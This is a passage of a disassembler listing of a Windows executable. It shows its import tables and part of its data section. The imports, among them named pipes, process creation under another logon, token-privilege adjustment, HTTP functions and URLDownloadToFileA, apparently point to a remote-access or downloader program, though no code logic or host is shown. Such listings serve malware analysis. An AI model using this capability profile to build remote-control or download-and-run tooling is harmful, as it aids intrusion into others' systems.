__IMPORT_DESCRIPTOR_ADVAPI32 dd rva off_424034 ; Import Name Table
                dd 0                    ; Time stamp
                dd 0                    ; Forwarder Chain
                dd rva aAdvapi32Dll     ; DLL Name
                dd rva LookupPrivilegeValueA ; Import Address Table
__IMPORT_DESCRIPTOR_WININET dd rva off_4241BC ; Import Name Table
                dd 0                    ; Time stamp
                dd 0                    ; Forwarder Chain
                dd rva aWininetDll      ; DLL Name
                dd rva InternetWriteFile ; Import Address Table
__IMPORT_DESCRIPTOR_WS2_32 dd rva dword_4241FC ; Import Name Table
                dd 0                    ; Time stamp
                dd 0                    ; Forwarder Chain
                dd rva aWs232Dll        ; DLL Name
                dd rva __imp_WS2_32_52  ; Import Address Table
__IMPORT_DESCRIPTOR_urlmon dd rva off_424218 ; Import Name Table
                dd 0                    ; Time stamp
                dd 0                    ; Forwarder Chain
                dd rva aUrlmonDll       ; DLL Name
                dd rva __imp_URLDownloadToFileA ; Import Address Table
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
;
; Import names for ADVAPI32.dll
;
off_424034      dd rva word_4244EE      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_ADVAPI32↑o
                dd rva word_4244DA
                dd rva word_4244C4
                dd rva word_4244B0
                dd rva word_424496
                dd rva word_424506
                dd 0
;
; Import names for KERNEL32.dll
;
off_424050      dd rva word_42428C      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_KERNEL32↑o
                dd rva word_42429C
                dd rva word_4242AE
                dd rva word_4242C2
                dd rva word_4242CE
                dd rva word_4242E4
                dd rva word_4242FA
                dd rva word_424310
                dd rva word_424328
                dd rva word_42433A
                dd rva word_42434A
                dd rva word_42435E
                dd rva word_42436C
                dd rva word_424382
                dd rva word_42439A
                dd rva word_424284
                dd rva word_4243B8
                dd rva word_4243D4
                dd rva word_4243EC
                dd rva word_424404
                dd rva word_42441C
                dd rva word_42442A
                dd rva word_42443E
                dd rva word_42444C
                dd rva word_424462
                dd rva word_424474
                dd rva word_424272
                dd rva word_424266
                dd rva word_424252
                dd rva word_424246
                dd rva word_424230
                dd rva word_4243AA
                dd rva word_424220
                dd rva word_424A9A
                dd rva word_424A8A
                dd rva word_424A76
                dd rva word_424A66
                dd rva word_424A50
                dd rva word_424A40
                dd rva word_424A18
                dd rva word_424A08
                dd rva word_4249F6
                dd rva word_4249E4
                dd rva word_4249D2
                dd rva word_4249C2
                dd rva word_4249B2
                dd rva word_4246A6
                dd rva word_4246B4
                dd rva word_4246CA
                dd rva word_4246DA
                dd rva word_4246F6
                dd rva word_424714
                dd rva word_424728
                dd rva word_424742
                dd rva word_42474E
                dd rva word_42475A
                dd rva word_424768
                dd rva word_42477A
                dd rva word_42478C
                dd rva word_424798
                dd rva word_4247A4
                dd rva word_4247BC
                dd rva word_4247D4
                dd rva word_4247DE
                dd rva word_4247EA
                dd rva word_4247FC
                dd rva word_424810
                dd rva word_42481E
                dd rva word_42482A
                dd rva word_424838
                dd rva word_424842
                dd rva word_424852
                dd rva word_42485E
                dd rva word_42486C
                dd rva word_42487C
                dd rva word_42488E
                dd rva word_4248A0
                dd rva word_4248B0
                dd rva word_4248BE
                dd rva word_4248D0
                dd rva word_4248E0
                dd rva word_4248EE
                dd rva word_4248FC
                dd rva word_42490C
                dd rva word_424926
                dd rva word_42493E
                dd rva word_424958
                dd rva word_424972
                dd rva word_42498C
                dd rva word_42499C
                dd 0
;
; Import names for WININET.dll
;
off_4241BC      dd rva word_42452C      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_WININET↑o
                dd rva word_424540
                dd rva word_424556
                dd rva word_42456C
                dd rva word_42457E
                dd rva word_424592
                dd rva word_4245B0
                dd rva word_4245C4
                dd rva word_424654
                dd rva word_42463E
                dd rva word_42462E
                dd rva word_42461A
                dd rva word_424600
                dd rva word_4245EE
                dd rva word_4245DA
                dd 0
;
; Import names for WS2_32.dll
;
dword_4241FC    dd 80000034h            ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_WS2_32↑o
                dd 8000006Fh
                dd 8000000Bh
                dd 80000073h
                dd 8000000Ch
                dd 80000039h
                dd 0
;
; Import names for urlmon.dll
;
off_424218      dd rva word_424684      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_urlmon↑o
                dd 0
word_424220     dw 38Dh                 ; DATA XREF: .rdata:004240D0↑o
                db 'PeekNamedPipe',0
word_424230     dw 4F9h                 ; DATA XREF: .rdata:004240C8↑o
                db 'WaitForSingleObject',0
word_424246     dw 459h                 ; DATA XREF: .rdata:004240C4↑o
                db 'SetEvent',0
                align 2
word_424252     dw 65h                  ; DATA XREF: .rdata:004240C0↑o
                db 'ConnectNamedPipe',0
                align 2
word_424266     dw 525h                 ; DATA XREF: .rdata:004240BC↑o
                db 'WriteFile',0
word_424272     dw 4C1h                 ; DATA XREF: .rdata:004240B8↑o
                db 'TerminateThread',0
word_424284     dw 4B2h                 ; DATA XREF: .rdata:0042408C↑o
                db 'Sleep',0
word_42428C     dw 82h                  ; DATA XREF: .rdata:off_424050↑o
                db 'CreateEventA',0
                align 4
word_42429C     dw 0A4h                 ; DATA XREF: .rdata:00424054↑o
                db 'CreateProcessA',0
                align 2
word_4242AE     dw 4C0h                 ; DATA XREF: .rdata:00424058↑o
                db 'TerminateProcess',0
                align 2
word_4242C2     dw 3C0h                 ; DATA XREF: .rdata:0042405C↑o
                db 'ReadFile',0
                align 2
word_4242CE     dw 26Fh                 ; DATA XREF: .rdata:00424060↑o
                db 'GetSystemDirectoryA',0
word_4242E4     dw 367h                 ; DATA XREF: .rdata:00424064↑o
                db 'MultiByteToWideChar',0
word_4242FA     dw 0E1h                 ; DATA XREF: .rdata:00424068↑o
                db 'DisconnectNamedPipe',0
word_424310     dw 44Ch                 ; DATA XREF: .rdata:0042406C↑o
                db 'SetCurrentDirectoryA',0
                align 4
word_424328     dw 262h                 ; DATA XREF: .rdata:00424070↑o
                db 'GetStartupInfoA',0
word_42433A     dw 202h                 ; DATA XREF: .rdata:00424074↑o
                db 'GetLastError',0
                align 2
word_42434A     dw 9Fh                  ; DATA XREF: .rdata:00424078↑o
                db 'CreateNamedPipeA',0
                align 2
word_42435E     dw 0A1h                 ; DATA XREF: .rdata:0042407C↑o
                db 'CreatePipe',0
                align 4
word_42436C     dw 213h                 ; DATA XREF: .rdata:00424080↑o
                db 'GetModuleFileNameA',0
                align 2
word_424382     dw 1BEh                 ; DATA XREF: .rdata:00424084↑o
                db 'GetCurrentDirectoryA',0
                align 2
word_42439A     dw 2A3h                 ; DATA XREF: .rdata:00424088↑o
                db 'GetVersionExA',0
word_4243AA     dw 52h                  ; DATA XREF: .rdata:004240CC↑o
                db 'CloseHandle',0
word_4243B8     dw 2E2h                 ; DATA XREF: .rdata:00424090↑o
                db 'InitializeCriticalSection',0
word_4243D4     dw 339h                 ; DATA XREF: .rdata:00424094↑o
                db 'LeaveCriticalSection',0
                align 4
word_4243EC     dw 0EEh                 ; DATA XREF: .rdata:00424098↑o
                db 'EnterCriticalSection',0
                align 4
word_424404     dw 0D1h                 ; DATA XREF: .rdata:0042409C↑o
                db 'DeleteCriticalSection',0
word_42441C     dw 88h                  ; DATA XREF: .rdata:004240A0↑o
                db 'CreateFileA',0
word_42442A     dw 1C0h                 ; DATA XREF: .rdata:004240A4↑o
                db 'GetCurrentProcess',0
word_42443E     dw 380h                 ; DATA XREF: .rdata:004240A8↑o
                db 'OpenProcess',0
word_42444C     dw 511h                 ; DATA XREF: .rdata:004240AC↑o
                db 'WideCharToMultiByte',0
word_424462     dw 245h                 ; DATA XREF: .rdata:004240B0↑o
                db 'GetProcAddress',0
                align 4
word_424474     dw 215h                 ; DATA XREF: .rdata:004240B4↑o
                db 'GetModuleHandleA',0
                align 4
aKernel32Dll    db 'KERNEL32.dll',0     ; DATA XREF: .rdata:00423FC8↑o
                align 2
word_424496     dw 7Dh                  ; DATA XREF: .rdata:00424044↑o
                db 'CreateProcessWithLogonW',0
word_4244B0     dw 1F7h                 ; DATA XREF: .rdata:00424040↑o
                db 'OpenProcessToken',0
                align 4
word_4244C4     dw 15Ah                 ; DATA XREF: .rdata:0042403C↑o
                db 'GetTokenInformation',0
word_4244DA     dw 190h                 ; DATA XREF: .rdata:00424038↑o
                db 'LookupAccountSidA',0
word_4244EE     dw 196h                 ; DATA XREF: .rdata:off_424034↑o
                db 'LookupPrivilegeValueA',0
word_424506     dw 1Fh                  ; DATA XREF: .rdata:00424048↑o
                db 'AdjustTokenPrivileges',0
aAdvapi32Dll    db 'ADVAPI32.dll',0     ; DATA XREF: .rdata:00423FDC↑o
                align 4
word_42452C     dw 0BFh                 ; DATA XREF: .rdata:off_4241BC↑o
                db 'InternetWriteFile',0
word_424540     dw 0Bh                  ; DATA XREF: .rdata:004241C0↑o
                db 'DeleteUrlCacheEntry',0
word_424556     dw 5Ch                  ; DATA XREF: .rdata:004241C4↑o
                db 'HttpSendRequestExA',0
                align 4
word_42456C     dw 59h                  ; DATA XREF: .rdata:004241C8↑o
                db 'HttpQueryInfoA',0
                align 2
word_42457E     dw 71h                  ; DATA XREF: .rdata:004241CC↑o
                db 'InternetConnectA',0
                align 2
word_424592     dw 9Bh                  ; DATA XREF: .rdata:004241D0↑o
                db 'InternetQueryDataAvailable',0
                align 10h
word_4245B0     dw 9Fh                  ; DATA XREF: .rdata:004241D4↑o
                db 'InternetReadFile',0
                align 4
word_4245C4     dw 0ACh                 ; DATA XREF: .rdata:004241D8↑o
                db 'InternetSetOptionA',0
                align 2
word_4245DA     dw 57h                  ; DATA XREF: .rdata:004241F4↑o
                db 'HttpOpenRequestA',0
                align 2
word_4245EE     dw 55h                  ; DATA XREF: .rdata:004241F0↑o
                db 'HttpEndRequestA',0
word_424600     dw 52h                  ; DATA XREF: .rdata:004241EC↑o
                db 'HttpAddRequestHeadersA',0
                align 2
word_42461A     dw 5Bh                  ; DATA XREF: .rdata:004241E8↑o
                db 'HttpSendRequestA',0
                align 2
word_42462E     dw 97h                  ; DATA XREF: .rdata:004241E4↑o
                db 'InternetOpenA',0
word_42463E     dw 6Bh                  ; DATA XREF: .rdata:004241E0↑o
                db 'InternetCloseHandle',0
word_424654     dw 9Dh                  ; DATA XREF: .rdata:004241DC↑o
                db 'InternetQueryOptionA',0
                align 4
aWininetDll     db 'WININET.dll',0      ; DATA XREF: .rdata:00423FF0↑o
aWs232Dll       db 'WS2_32.dll',0       ; DATA XREF: .rdata:00424004↑o
                align 4
word_424684     dw 67h                  ; DATA XREF: .rdata:off_424218↑o
                db 'URLDownloadToFileA',0
                align 2
aUrlmonDll      db 'urlmon.dll',0       ; DATA XREF: .rdata:00424018↑o
                align 2
word_4246A6     dw 11Ah                 ; DATA XREF: .rdata:00424108↑o
                db 'ExitThread',0
                align 4
word_4246B4     dw 1C5h                 ; DATA XREF: .rdata:0042410C↑o
                db 'GetCurrentThreadId',0
                align 2
word_4246CA     dw 0B5h                 ; DATA XREF: .rdata:00424110↑o
                db 'CreateThread',0
                align 2
word_4246DA     dw 4D3h                 ; DATA XREF: .rdata:00424114↑o
                db 'UnhandledExceptionFilter',0
                align 2
word_4246F6     dw 4A5h                 ; DATA XREF: .rdata:00424118↑o
                db 'SetUnhandledExceptionFilter',0
word_424714     dw 300h                 ; DATA XREF: .rdata:0042411C↑o
                db 'IsDebuggerPresent',0
word_424728     dw 279h                 ; DATA XREF: .rdata:00424120↑o
                db 'GetSystemTimeAsFileTime',0
word_424742     dw 2CFh                 ; DATA XREF: .rdata:00424124↑o
                db 'HeapFree',0
                align 2
word_42474E     dw 2CBh                 ; DATA XREF: .rdata:00424128↑o
                db 'HeapAlloc',0
word_42475A     dw 2D2h                 ; DATA XREF: .rdata:0042412C↑o
                db 'HeapReAlloc',0
word_424768     dw 186h                 ; DATA XREF: .rdata:00424130↑o
                db 'GetCommandLineA',0
word_42477A     dw 3B1h                 ; DATA XREF: .rdata:00424134↑o
                db 'RaiseException',0
                align 4
word_42478C     dw 418h                 ; DATA XREF: .rdata:00424138↑o
                db 'RtlUnwind',0
word_424798     dw 172h                 ; DATA XREF: .rdata:0042413C↑o
                db 'GetCPInfo',0
word_4247A4     dw 2EFh                 ; DATA XREF: .rdata:00424140↑o
                db 'InterlockedIncrement',0
                align 4
word_4247BC     dw 2EBh                 ; DATA XREF: .rdata:00424144↑o
                db 'InterlockedDecrement',0
                align 4
word_4247D4     dw 168h                 ; DATA XREF: .rdata:00424148↑o
                db 'GetACP',0
                align 2
word_4247DE     dw 237h                 ; DATA XREF: .rdata:0042414C↑o
                db 'GetOEMCP',0
                align 2
word_4247EA     dw 30Ah                 ; DATA XREF: .rdata:00424150↑o
                db 'IsValidCodePage',0
word_4247FC     dw 218h                 ; DATA XREF: .rdata:00424154↑o
                db 'GetModuleHandleW',0
                align 10h
word_424810     dw 4C7h                 ; DATA XREF: .rdata:00424158↑o
                db 'TlsGetValue',0
word_42481E     dw 4C5h                 ; DATA XREF: .rdata:0042415C↑o
                db 'TlsAlloc',0
                align 2
word_42482A     dw 4C8h                 ; DATA XREF: .rdata:00424160↑o
                db 'TlsSetValue',0
word_424838     dw 4C6h                 ; DATA XREF: .rdata:00424164↑o
                db 'TlsFree',0
word_424842     dw 473h                 ; DATA XREF: .rdata:00424168↑o
                db 'SetLastError',0
                align 2
word_424852     dw 2D4h                 ; DATA XREF: .rdata:0042416C↑o
                db 'HeapSize',0
                align 2
word_42485E     dw 119h                 ; DATA XREF: .rdata:00424170↑o
                db 'ExitProcess',0
word_42486C     dw 19Ah                 ; DATA XREF: .rdata:00424174↑o
                db 'GetConsoleCP',0
                align 4
word_42487C     dw 1ACh                 ; DATA XREF: .rdata:00424178↑o
                db 'GetConsoleMode',0
                align 2
word_42488E     dw 46Fh                 ; DATA XREF: .rdata:0042417C↑o
                db 'SetHandleCount',0
                align 10h
word_4248A0     dw 264h                 ; DATA XREF: .rdata:00424180↑o
                db 'GetStdHandle',0
                align 10h
word_4248B0     dw 1F3h                 ; DATA XREF: .rdata:00424184↑o
                db 'GetFileType',0
word_4248BE     dw 466h                 ; DATA XREF: .rdata:00424188↑o
                db 'SetFilePointer',0
                align 10h
word_4248D0     dw 487h                 ; DATA XREF: .rdata:0042418C↑o
                db 'SetStdHandle',0
                align 10h
word_4248E0     dw 2CDh                 ; DATA XREF: .rdata:00424190↑o
                db 'HeapCreate',0
                align 2
word_4248EE     dw 4ECh                 ; DATA XREF: .rdata:00424194↑o
                db 'VirtualFree',0
word_4248FC     dw 4E9h                 ; DATA XREF: .rdata:00424198↑o
                db 'VirtualAlloc',0
                align 4
word_42490C     dw 160h                 ; DATA XREF: .rdata:0042419C↑o
                db 'FreeEnvironmentStringsA',0
word_424926     dw 1D8h                 ; DATA XREF: .rdata:004241A0↑o
                db 'GetEnvironmentStrings',0
word_42493E     dw 161h                 ; DATA XREF: .rdata:004241A4↑o
                db 'FreeEnvironmentStringsW',0
word_424958     dw 1DAh                 ; DATA XREF: .rdata:004241A8↑o
                db 'GetEnvironmentStringsW',0
                align 2
word_424972     dw 3A7h                 ; DATA XREF: .rdata:004241AC↑o
                db 'QueryPerformanceCounter',0
word_42498C     dw 293h                 ; DATA XREF: .rdata:004241B0↑o
                db 'GetTickCount',0
                align 4
word_42499C     dw 1C1h                 ; DATA XREF: .rdata:004241B4↑o
                db 'GetCurrentProcessId',0
word_4249B2     dw 32Bh                 ; DATA XREF: .rdata:00424104↑o
                db 'LCMapStringA',0
                align 2
word_4249C2     dw 32Dh                 ; DATA XREF: .rdata:00424100↑o
                db 'LCMapStringW',0
                align 2
word_4249D2     dw 266h                 ; DATA XREF: .rdata:004240FC↑o
                db 'GetStringTypeA',0
                align 4
word_4249E4     dw 269h                 ; DATA XREF: .rdata:004240F8↑o
                db 'GetStringTypeW',0
                align 2
word_4249F6     dw 204h                 ; DATA XREF: .rdata:004240F4↑o
                db 'GetLocaleInfoA',0
                align 4
word_424A08     dw 33Ch                 ; DATA XREF: .rdata:004240F0↑o
                db 'LoadLibraryA',0
                align 4
word_424A18     dw 2E3h                 ; DATA XREF: .rdata:004240EC↑o
                db 'InitializeCriticalSectionAndSpinCount',0
word_424A40     dw 51Ah                 ; DATA XREF: .rdata:004240E8↑o
                db 'WriteConsoleA',0
word_424A50     dw 1B0h                 ; DATA XREF: .rdata:004240E4↑o
                db 'GetConsoleOutputCP',0
                align 2
word_424A66     dw 524h                 ; DATA XREF: .rdata:004240E0↑o
                db 'WriteConsoleW',0
word_424A76     dw 157h                 ; DATA XREF: .rdata:004240DC↑o
                db 'FlushFileBuffers',0
                align 2
word_424A8A     dw 453h                 ; DATA XREF: .rdata:004240D8↑o
                db 'SetEndOfFile',0
                align 2
word_424A9A     dw 24Ah                 ; DATA XREF: .rdata:004240D4↑o
                db 'GetProcessHeap',0
                align 800h
_rdata          ends

; Section 3. (virtual address 00025000)
; Virtual size                  : 00008B40 (  35648.)
; Section size in file          : 00005C00 (  23552.)
; Offset to raw data for section: 00023400
; Flags C0000040: Data Readable Writable
; Alignment     : default
; ===========================================================================

; Segment type: Pure data
; Segment permissions: Read/Write
_data           segment para public 'DATA' use32
                assume cs:_data
                ;org 425000h
                dd offset aBadAllocation ; "bad allocation"
                dd offset aBadAllocation ; "bad allocation"
                dd offset aBadAllocation ; "bad allocation"
                align 10h
                dd offset aBadAllocation ; "bad allocation"
off_425014      dd offset off_4202D8    ; DATA XREF: .rdata:004228F8↑o
                                        ; .rdata:off_422918↑o
                db    0
                db    0
                db    0
                db    0
                db  2Eh ; .
                db  3Fh ; ?
                db  41h ; A
                db  56h ; V
                db  74h ; t
                db  79h ; y
                db  70h ; p
                db  65h ; e
                db  5Fh ; _
                db  69h ; i
                db  6Eh ; n
                db  66h ; f
                db  6Fh ; o
                db  40h ; @
                db  40h ; @
                db    0
off_42502C      dd offset aBadAllocation
                                        ; DATA XREF: sub_40F934+5↑o
                                        ; "bad allocation"
dword_425030    dd 1                    ; DATA XREF: sub_41615F+32↑r
                                        ; sub_4161E0+3C↑r ...
                align 10h
___security_cookie dd 0BB40E64Eh        ; DATA XREF: sub_4010D0+10↑r
                                        ; sub_401240+11↑r ...
dword_425044    dd 44BF19B1h            ; DATA XREF: sub_4107C6+B0↑r
                                        ; sub_417AF4+2B↑w ...
dword_425048    dd 1                    ; DATA XREF: sub_4108CC:loc_4108D6↑r
dword_42504C    dd 16h                  ; DATA XREF: sub_4108CC:loc_4108F2↑r
                db    2
                db    0
                db    0
                db    0
                db    2
                db    0
                db    0
                db    0
                db    3
                db    0
                db    0
                db    0
                db    2
                db    0
                db    0
                db    0
                db    4
                db    0
                db    0
                db    0
                db  18h
                db    0
                db    0
                db    0
                db    5
                db    0
                db    0
                db    0
                db  0Dh
                db    0
                db    0
                db    0
                db    6
                db    0
                db    0
                db    0
                db    9
                db    0
                db    0
                db    0
                db    7
                db    0
                db    0
                db    0
                db  0Ch
                db    0
                db    0
                db    0
                db    8
                db    0
                db    0
                db    0
                db  0Ch
                db    0
                db    0
                db    0
                db    9
                db    0
                db    0
                db    0
                db  0Ch
                db    0
                db    0
                db    0
                db  0Ah
                db    0
                db    0
                db    0
                db    7
                db    0
                db    0
                db    0
                db  0Bh
                db    0
                db    0
                db    0
                db    8
                db    0
                db    0
                db    0
                db  0Ch
                db    0
                db    0
                db    0
                db  16h
                db    0
                db    0
                db    0
                db  0Dh
                db    0
                db    0
                db    0
                db  16h
                db    0
                db    0
                db    0
                db  0Fh
                db    0
                db    0
                db    0
                db    2
                db    0
                db    0
                db    0
                db  10h
                db    0
                db    0
                db    0
                db  0Dh
                db    0
                db    0
                db    0
                db  11h
                db    0
                db    0
                db    0
                db  12h
                db    0
                db    0
                db    0
                db  12h
                db    0
                db    0
                db    0
                db    2
                db    0
                db    0
                db    0
                db  21h ; !
                db    0
                db    0
                db    0
                db  0Dh
                db    0
                db    0
                db    0
                db  35h ; 5
                db    0
                db    0
                db    0
                db    2
                db    0
                db    0
                db    0
                db  41h ; A
                db    0
                db    0
                db    0
                db  0Dh
                db    0
                db    0
                db    0
                db  43h ; C
                db    0
                db    0
                db    0
                db    2
                db    0
                db    0
                db    0
                db  50h ; P
                db    0
                db    0
                db    0
                db  11h
                db    0
                db    0
                db    0
                db  52h ; R
                db    0
                db    0
                db    0
                db  0Dh
                db    0
                db    0
                db    0
                db  53h ; S
                db    0
                db    0
                db    0
                db  0Dh
                db    0
                db    0
                db    0
                db  57h ; W
                db    0
                db    0
                db    0
                db  16h
                db    0
                db    0
                db    0
                db  59h ; Y
                db    0
                db    0
                db    0
                db  0Bh
                db    0
                db    0
                db    0
                db  6Ch ; l
                db    0
                db    0
                db    0
                db  0Dh
                db    0
                db    0
                db    0
                db  6Dh ; m
                db    0
                db    0
                db    0
                db  20h
                db    0
                db    0
                db    0
                db  70h ; p
                db    0
                db    0
                db    0
                db  1Ch
                db    0
                db    0
                db    0
                db  72h ; r
                db    0
                db    0
                db    0
                db    9
                db    0
                db    0
                db    0
                db    6
                db    0
                db    0
                db    0
                db  16h
                db    0
                db    0
                db    0
                db  80h ; €
                db    0
                db    0
                db    0
                db  0Ah
                db    0
                db    0
                db    0
                db  81h
                db    0
                db    0
                db    0
                db  0Ah
                db    0
                db    0
                db    0
                db  82h ; ‚
                db    0
                db    0
                db    0
                db    9
                db    0
                db    0
                db    0
                db  83h ; ƒ
                db    0
                db    0
                db    0
                db  16h
                db    0
                db    0
                db    0
                db  84h ; „
                db    0
                db    0
                db    0
                db  0Dh
                db    0
                db    0
                db    0
                db  91h ; ‘
                db    0
                db    0
                db    0
                db  29h ; )
                db    0
                db    0
                db    0
                db  9Eh ; ž
                db    0
                db    0
                db    0
                db  0Dh
                db    0
                db    0
                db    0
                db 0A1h ; ¡
                db    0
                db    0
                db    0
                db    2
                db    0
                db    0
                db    0
                db 0A4h ; ¤
                db    0
                db    0
                db    0
                db  0Bh
                db    0
                db    0
                db    0
                db 0A7h ; §
                db    0
                db    0
                db    0
                db  0Dh
                db    0
                db    0
                db    0
                db 0B7h ; ·
                db    0
                db    0
                db    0
                db  11h
                db    0
                db    0
                db    0
                db 0CEh ; Î
                db    0
                db    0
                db    0
                db    2
                db    0
                db    0
                db    0
                db 0D7h ; ×
                db    0
                db    0
                db    0
                db  0Bh
                db    0
                db    0
                db    0
                db  18h
                db    7
                db    0
                db    0
                db  0Ch
                db    0
                db    0
                db    0
unk_4251B0      db  0Ch                 ; DATA XREF: sub_41090E+9↑o
                db    0
                db    0
                db    0
unk_4251B4      db    8                 ; DATA XREF: sub_410921+9↑o
                db    0
                db    0
                db    0
off_4251B8      dd offset aNull         ; DATA XREF: sub_410B61:loc_41111B↑r
                                        ; sub_410B61+97B↑r
                                        ; "(null)"
off_4251BC      dd offset aNull_0       ; DATA XREF: sub_410B61+4CA↑r
                                        ; "(null)"
unk_4251C0      db    0                 ; DATA XREF: sub_411728+32↑o
                                        ; sub_41191F+63↑o ...
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  61h ; a
                db  62h ; b
                db  63h ; c
                db  64h ; d
                db  65h ; e
                db  66h ; f
                db  67h ; g
                db  68h ; h
                db  69h ; i
                db  6Ah ; j
                db  6Bh ; k
                db  6Ch ; l
                db  6Dh ; m
                db  6Eh ; n
                db  6Fh ; o
                db  70h ; p
                db  71h ; q
                db  72h ; r
                db  73h ; s
                db  74h ; t
                db  75h ; u
                db  76h ; v
                db  77h ; w
                db  78h ; x
                db  79h ; y
                db  7Ah ; z
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  41h ; A
                db  42h ; B
                db  43h ; C
                db  44h ; D
                db  45h ; E
                db  46h ; F
                db  47h ; G
                db  48h ; H
                db  49h ; I
                db  4Ah ; J
                db  4Bh ; K
                db  4Ch ; L
                db  4Dh ; M
                db  4Eh ; N
                db  4Fh ; O
                db  50h ; P
                db  51h ; Q
                db  52h ; R
                db  53h ; S
                db  54h ; T
                db  55h ; U
                db  56h ; V
                db  57h ; W
                db  58h ; X
                db  59h ; Y
                db  5Ah ; Z
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
byte_4253E0     db 0                    ; DATA XREF: sub_411C24+102↑w
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  10h
                db  10h
